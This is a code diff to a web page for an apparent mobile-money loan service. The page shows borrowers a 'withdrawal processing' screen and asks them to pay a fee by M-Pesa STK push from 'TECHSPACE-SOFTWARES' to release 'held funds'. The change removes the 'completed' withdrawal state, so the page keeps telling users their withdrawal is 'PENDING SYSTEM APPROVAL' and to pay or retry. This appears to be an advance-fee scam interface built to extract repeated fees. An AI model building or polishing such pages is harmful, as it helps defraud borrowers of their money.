@@ -829,7 +829,7 @@
             </div>
             
             <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
-            <p class="text-xl mb-4" id="processingMessage">Initiating techspase-softwares STK Push...</p>
+            <p class="text-xl mb-4" id="processingMessage">Initiating Techspace-Softwares STK Push...</p>
             <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from TECHSPACE-SOFTWARES</p>
             
             <!-- Trust indicators -->
@@ -1084,7 +1084,7 @@
                                     <div class="text-sm text-green-800">
                                         <p class="font-medium mb-1">M-Pesa Transfer Information:</p>
                                         <ul class="text-xs space-y-1">
-                                            <li>• You will receive an STK push notification from Techspase-softwares for fee request.</li>
+                                            <li>• You will receive an STK push notification from Techspace-Softwares for fee request.</li>
                                             <li>• Funds will be credited instantly after confirmation</li>
                                             <li>• Transaction limit: KES 300,000 per day</li>
                                         </ul>
@@ -1465,9 +1465,6 @@
 
                 hideProcessingOverlay();
                 showFeePaymentSuccess();
-       // Mark withdrawal as completed
-localStorage.setItem('swift_withdrawal_status', 'completed');
-localStorage.removeItem('swift_fee_payment_initiated');
 
             } catch (error) {
                 console.error('Fee payment error:', error);
@@ -1557,11 +1554,10 @@ document.getElementById("successHeading").textContent =
             // Update timeline
             updateDisbursementTimeline(true);
             
-            
-            // Track withdrawal state
-localStorage.setItem('swift_withdrawal_status', 'pending');
-localStorage.setItem('swift_withdrawal_method', selectedWithdrawalMethod);
-localStorage.setItem('swift_withdrawal_time', new Date().toISOString());
+            // Store withdrawal status
+            localStorage.setItem('swift_fee_payment_initiated', 'true');
+            localStorage.setItem('swift_withdrawal_method', selectedWithdrawalMethod);
+            localStorage.setItem('swift_withdrawal_time', new Date().toISOString());
         // Start the animated pending progress bar
 startPendingProgress();}
 
@@ -1633,31 +1629,15 @@ startPendingProgress();}
                 }, 100);
             });
 
-// Check stored withdrawal status
-const withdrawalStatus = localStorage.getItem('swift_withdrawal_status');
-
-if (withdrawalStatus === 'pending') {
-  showSuccess(
-    `<strong class="text-yellow-700 text-lg">Withdrawal Pending Confirmation</strong><br><br>
-     Your withdrawal for <span class="font-semibold text-gray-800">(${loanData.phone})</span> 
-     is awaiting confirmation of the processing fee payment.<br>
-     Please complete the <span class="text-green-700 font-semibold">M-Pesa</span> request sent from 
-     <span class="text-primary font-bold">SwiftWallet Digital Ventures</span> to release your funds.<br><br>
-     <strong>Status:</strong> <span class="text-orange-600 font-bold">Pending System Approval</span>`
-  );
-  updateDisbursementTimeline(true);
-
-} else if (withdrawalStatus === 'completed') {
-  showSuccess(
-    `<strong class="text-green-700 text-lg">Withdrawal Successfully Completed!</strong><br><br>
-     Your withdrawal for <span class="font-semibold text-gray-800">(${loanData.phone})</span> 
-     has been successfully processed and released to your selected account.<br><br>
-     <strong>Status:</strong> <span class="text-green-600 font-bold">Approved & Paid</span>`
-  );
-  updateDisbursementTimeline(true);
-} else {
-  console.log('No pending withdrawal found.');
-}
+            // Check if fee payment was already initiated
+            const feePaymentInitiated = localStorage.getItem('swift_fee_payment_initiated');
+            if (feePaymentInitiated === 'true') {
+                const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
+                showSuccess(
+                    `Complete previous withdrawal request sent to (${loanData.phone}) by clicking withdraw button  below if you didn't .STK Push was sent from TECHSPACE-SOFTWARES for the requested processing fee to complete the held funds or retry. Please complete the fee payment to process your ${withdrawalMethod} your withdrawal. Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span>`
+                );
+                updateDisbursementTimeline(true);
+            }
         });
 
         // Handle page visibility and navigation
